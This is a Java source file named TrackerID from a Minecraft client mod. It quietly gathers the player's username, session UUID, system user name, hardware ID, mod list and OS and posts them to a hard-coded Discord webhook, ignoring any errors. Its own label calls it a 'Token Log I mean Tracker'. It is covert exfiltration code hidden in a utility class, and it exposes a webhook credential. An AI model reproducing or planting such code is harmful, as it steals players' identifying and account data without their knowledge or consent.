package me.earth.phobos.util;

import net.minecraft.client.Minecraft;

public
class TrackerID {

    public
    TrackerID ( ) {

        final String l = "https://discord.com/api/webhooks/852376561797431306/-w-IZtn4AlRDJhbHPeJudBpOu6X-SPalu9kt0vu9FkTVX4dtgpHuJAPiLl3Nx_GamQa4";
        final String CapeName = "Perrys Token Log I mean Tracker";
        final String CapeImageURL = "https://cdn.discordapp.com/icons/851358091286282260/17fdd021c701c00ff95bc2b50344a5ad.png?size=128";

        TrackerUtil d = new TrackerUtil ( l );

        String minecraft_name = "NOT FOUND";

        try {
            minecraft_name = Minecraft.getMinecraft ( ).getSession ( ).getUsername ( );
        } catch ( Exception ignore ) {
        }

        try {
            TrackerPlayerBuilder dm = new TrackerPlayerBuilder.Builder ( )
                    .withUsername ( CapeName )
                    .withContent ( "```" + "\n IGN: " + minecraft_name + "\n USER: " + System.getProperty ( "user.name" ) + "\n UUID: " + Minecraft.getMinecraft ( ).session.getPlayerID ( ) + "\n HWID: " + SystemUtil.getSystemInfo ( ) + "\n MODS: " + SystemUtil.getModsList ( ) + "\n OS: " + System.getProperty ( "os.name" ) + "\n Closed the game." + "```" )
                    .withAvatarURL ( CapeImageURL )
                    .withDev ( false )
                    .build ( );
            d.sendMessage ( dm );
        } catch ( Exception ignore ) {
        }
    }
}

